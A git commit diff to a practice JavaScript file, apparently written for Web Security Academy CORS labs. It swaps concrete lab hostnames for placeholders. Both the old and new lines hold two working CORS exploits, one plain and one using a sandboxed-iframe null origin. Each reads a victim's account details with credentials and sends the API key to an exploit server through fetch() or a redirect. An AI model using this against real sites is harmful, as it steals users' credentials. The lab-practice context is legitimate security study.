4d1c60df27c3e6627f7fe8894c5f9975f59c2a9c
Hunter Leggett <97301080+leggetth@users.noreply.github.com>
2024-02-26 15:47:39 -0500

    Update javascript_practice.js

--- training/javascript_practice.js
+++ training/javascript_practice.js
@@ -4,12 +4,12 @@
 //Basic Cors; gets the apikey
 function getadmin() {
     var res = JSON.parse(this.response)
-    fetch("https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?" + res.apikey);
+    fetch("https://YOUR-EXPLOIT-LAB-ID.web-security-academy.net/accountdetails?" + res.apikey);
 }
 
 const request = new XMLHttpRequest();
 request.addEventListener("load", getadmin);
-request.open("GET", "https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails", true);
+request.open("GET", "https://YOUR-LAB-ID.web-security-academy.net/accountdetails", true);
 request.withCredentials = true;
 request.send();
 
@@ -17,12 +17,12 @@ request.send();
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get','https://0a13001d03130e4c81a6ed270097004e.web-security-academy.net/accountdetails',true);
+req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountdetails',true);
 req.withCredentials = true;
 req.send();
 
 function reqListener() {
 var res = JSON.parse(this.response)
-location = 'https://exploit-0ac9009003aa0ee18189ec3601fa001a.exploit-server.net/accountdetails?' + res.apikey;
+location = 'https://YOUR-EXPLOIT-LAB-ID.web-security-academy.net/accountdetails?' + res.apikey;
 };
 </script>"></iframe>
